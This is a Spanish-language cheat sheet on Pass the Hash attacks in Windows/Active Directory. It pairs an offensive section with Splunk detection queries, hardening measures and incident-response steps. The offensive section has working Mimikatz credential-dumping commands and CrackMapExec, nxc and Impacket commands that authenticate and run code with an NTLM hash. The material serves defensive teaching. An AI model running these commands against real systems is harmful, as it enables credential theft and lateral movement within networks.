# 🔑 Pass the Hash - Autenticación con hashes NTLM sin contraseñas

---

## 📝 ¿Qué es Pass the Hash y por qué es tan crítico?

| Concepto      | Descripción                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica que permite a un atacante autenticarse en sistemas remotos usando hashes NTLM sin conocer la contraseña en texto plano. Aprovecha el protocolo NTLM que acepta hashes como credencial válida. |
| **Uso**       | Herramientas como Mimikatz, CrackMapExec, nxc, Impacket y PsExec utilizan esta técnica para movimiento lateral y escalada de privilegios en entornos Windows/Active Directory. |

---

## 🛠️ ¿Cómo funciona el ataque? (paso a paso real)

| Fase             | Acción                                                                                                          |
|------------------|-----------------------------------------------------------------------------------------------------------------|
| **Extracción**   | El atacante obtiene hashes NTLM desde memoria (LSASS), archivos SAM, NTDS.dit o mediante ataques de volcado.   |
| **Validación**   | Verifica que los hashes extraídos sean válidos y funcionales para autenticación.                                |
| **Autenticación**| Utiliza el hash NTLM directamente en el protocolo NTLM para autenticarse sin descifrar la contraseña.          |
| **Movimiento**   | Se conecta a sistemas remotos usando los hashes para ejecutar comandos, acceder a recursos o establecer sesiones.|
| **Persistencia** | Mantiene acceso usando las credenciales hash en múltiples sistemas de la red.                                   |

---

## 💻 Ejemplo ofensivo (comandos reales)

```bash
# Extracción de hashes con Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Pass the Hash con CrackMapExec
crackmapexec smb 192.168.1.10 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Pass the Hash con nxc
nxc smb 192.168.1.10 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Pass the Hash con Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10

# Pass the Hash para WMI
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10

# Secretsdump para extraer más hashes
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10
```

---

## 📊 Detección en Splunk

| Evento clave | Descripción                                                                                                   |
|--------------|--------------------------------------------------------------------------------------------------------------|
| **4624**     | Inicio de sesión exitoso con tipo 3 (red) usando autenticación NTLM.                                        |
| **4776**     | Autenticación NTLM exitosa con misma cuenta desde múltiples IPs.                                             |
| **4768/4769**| Solicitudes Kerberos anómalas cuando se mezclan con NTLM (posible fallback).                                 |
| **4648**     | Inicio de sesión con credenciales explícitas (runas/pass the hash).                                          |
| **4625**     | Fallos de autenticación previos que preceden a autenticaciones exitosas sospechosas.                         |
| **5140**     | Acceso a recursos compartidos administrativos tras autenticación con hash.                                    |
| **4634**     | Cierre de sesión tras actividades de movimiento lateral.                                                     |

### Query Splunk esencial

```splunk
index=dc_logs EventCode=4624
| search Logon_Type=3 Authentication_Package=NTLM
| stats count dc(Source_Network_Address) as IPs_unicas by Account_Name, _time
| where IPs_unicas > 3
| sort -count
```

### Query para detectar patrones Pass the Hash

```splunk
index=dc_logs (EventCode=4624 OR EventCode=4776)
| search Authentication_Package=NTLM
| bin _time span=5m
| stats count dc(ComputerName) as sistemas_accedidos, list(ComputerName) as sistemas by Account_Name, _time
| where sistemas_accedidos >= 3
| table _time, Account_Name, sistemas_accedidos, sistemas
```

### Query para correlacionar extracción y uso de hashes

```splunk
index=security_logs (EventCode=4624 OR EventCode=4648 OR EventCode=10)
| search (Process_Name="*mimikatz*" OR Process_Name="*lsass*" OR Logon_Type=9)
| stats list(EventCode) as eventos, min(_time) as inicio, max(_time) as fin by Account_Name, ComputerName
| table inicio, fin, Account_Name, ComputerName, eventos
```

---

## 🦾 Hardening y mitigación

| Medida                                  | Descripción                                                                                      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Credential Guard**                     | Activa Windows Defender Credential Guard para proteger credenciales en memoria.                 |
| **LSASS Protection**                     | Habilita LSA Protection para prevenir acceso no autorizado al proceso LSASS.                    |
| **Privileged Access Workstations (PAW)**| Utiliza estaciones de trabajo dedicadas para administradores privilegiados.                     |
| **Kerberos Authentication**              | Fuerza el uso de Kerberos sobre NTLM siempre que sea posible.                                   |
| **Network Level Authentication**         | Requiere autenticación antes de establecer sesiones RDP completas.                              |
| **Restricted Admin Mode**                | Activa modo administrador restringido para RDP y PowerShell remoto.                             |
| **Account Tiering**                      | Implementa modelo de niveles para cuentas administrativas (Tier 0, 1, 2).                       |
| **Regular Password Changes**             | Cambia contraseñas de cuentas privilegiadas regularmente para invalidar hashes.                  |

---

## 🚨 Respuesta ante incidentes

1. **Aísla inmediatamente** las cuentas sospechosas que muestran patrones de Pass the Hash.
2. **Cambia contraseñas** de todas las cuentas comprometidas para invalidar los hashes.
3. **Identifica el vector inicial** de compromiso (cómo se extrajeron los hashes).
4. **Mapea el movimiento lateral** correlacionando eventos 4624/4776 en múltiples sistemas.
5. **Busca persistencia** creada durante el período de compromiso activo.
6. **Reinicia sistemas comprometidos** para limpiar credenciales en memoria.
7. **Implementa monitoreo adicional** en sistemas afectados por 30-60 días.

---

## 💡 Soluciones innovadoras

- **Honeyhashes:** Crea cuentas trampa con hashes monitoreados que alerten su uso.
- **Memory Analysis Continuous:** Monitoreo continuo de memoria LSASS para detectar extracción de credenciales.
- **Behavioral Analytics:** Detecta patrones anómalos de autenticación basados en ubicación, horario y frecuencia.
- **Hash Rotation:** Rotación automática de hashes de cuentas de servicio cada 24-48 horas.
- **Lateral Movement Traps:** Sistemas trampa que alertan ante intentos de acceso con credenciales robadas.

---

## ⚡ CVEs y técnicas MITRE relevantes

- **T1550.002 (Pass the Hash):** Uso de hashes NTLM para autenticación
- **T1003.001 (LSASS Memory):** Extracción de credenciales desde memoria LSASS
- **T1021.002 (SMB/Windows Admin Shares):** Movimiento lateral usando hashes
- **CVE-2022-26925:** Vulnerabilidad LSA que facilita extracción de credenciales
- **CVE-2021-42278/42287 (sAMAccountName spoofing):** Escalada que puede facilitar Pass the Hash

---

## 📚 Referencias

- [Mimikatz - Credential Extraction](https://github.com/gentilkiwi/mimikatz)
- [CrackMapExec Pass the Hash](https://github.com/Porchetta-Industries/CrackMapExec)
- [Impacket Examples](https://github.com/fortra/impacket)
- [Microsoft - Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [NIST - Pass the Hash Mitigation](https://www.nist.gov/cybersecurity)
- [MITRE ATT&CK - T1550.002](https://attack.mitre.org/techniques/T1550/002/)